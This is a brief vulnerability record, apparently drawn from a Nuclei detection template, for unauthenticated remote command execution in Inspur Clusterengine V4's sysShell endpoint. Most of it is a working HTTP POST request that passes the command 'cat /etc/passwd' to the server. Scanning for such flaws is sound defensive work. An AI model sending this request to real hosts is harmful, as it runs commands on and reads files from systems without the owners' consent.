# Vulnerability: Inspur Clusterengine V4 SYSshell - Remote Command Execution
**Classification:** CWE-88
**Source:** Nuclei Template (`inspur-clusterengine-rce.yaml`)

## Description
Inspur Clusterengine V4 SYSshell was found and allows remote command execution by design.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /sysShell HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Cookie: lang=cn

op=doPlease&node=cu01&command=cat+/etc/passwd
```

